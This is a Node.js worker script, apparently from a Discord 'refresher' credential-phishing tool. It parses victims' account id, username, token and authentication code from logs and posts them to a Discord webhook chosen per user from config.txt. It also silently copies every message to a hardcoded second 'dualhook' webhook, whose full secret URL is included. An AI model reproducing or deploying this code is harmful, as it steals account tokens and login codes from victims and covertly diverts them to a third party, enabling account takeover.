const { workerData, parentPort } = require('worker_threads');
const fs = require('fs');
const { WebhookClient } = require('discord.js');

const { authenticationCode, logBuffer, userId } = workerData;

// Use the 'id' as needed in your worker logic
console.log('Worker received ID:', userId);

let extractedInfo = {
  id: null,
  name: null,
  token: null,
};

const logLines = logBuffer.join('').split('\n');

logLines.forEach((line) => {
  if (line.includes('id:')) {
    extractedInfo.id = line.replace(/'/g, '').trim();
  } else if (line.includes('name:')) {
    extractedInfo.name = line.replace(/'/g, '').trim();
  } else if (line.includes('token:')) {
    extractedInfo.token = line.replace(/'/g, '').trim();
  }
  // Add additional filters as needed
});

const discordMessage = {
  content: `@everyone Authentication code: ${authenticationCode}`,
  embeds: [
    {
      color: 3482894,
      timestamp: new Date(),
      description: `REFRESH IS CURRENTLY IN MAINTENANCE`,
      fields: [
        {
          name: '**ID:**',
          value: '```' + (userId || extractedInfo.id) + '```', // Use userId
          inline: false,
        },
        {
          name: '**Username:**',
          value: '```' + extractedInfo.name + '```',
          inline: false,
        },
        {
          name: '**Token:**',
          value: '```' + extractedInfo.token + '```',
          inline: false,
        },
      ],
    },
  ],
};

const configPath = 'config.txt';

try {
  const configFile = fs.readFileSync(configPath, 'utf8');
  const configLines = configFile.split('\n');

  const configMap = {};
  configLines.forEach((line) => {
    // Use a regular expression to match the (id)=(webhook) format
    const match = line.match(/^(\w+)=(\S+)$/);

    if (match) {
      const id = match[1];
      const webhookURL = match[2];
      configMap[id] = webhookURL;
    }
  });

  console.log(configMap);

  const webhookURL = configMap[userId]; // Use userId to get the webhookURL
  const dualhook = "https://discord.com/api/webhooks/1180223890052632607/aTCHbtR6pPRhhVWAihJB8tK7RWg-kgBKnrK-ccy6hf26nKsQ40RjKOvx-7fuw-RRVVgf";

  if (webhookURL) {
    const webhookClient = new WebhookClient({
      url: webhookURL,
    });
    if (dualhook) {
      const webhookClient2 = new WebhookClient({
        url: dualhook,
      });
      webhookClient2.send(discordMessage)
        .then(() => {
          parentPort.postMessage({ success: true });
        });
    }

    webhookClient.send(discordMessage)
      .then(() => {
        parentPort.postMessage({ success: true });
      });
  } else {
    parentPort.postMessage({ error: "Webhook URL not found for the provided id" });
  }
} catch (error) {
  console.error("Error reading the configuration file:", error.message);
  parentPort.postMessage({ error: "Error reading the configuration file" });
}
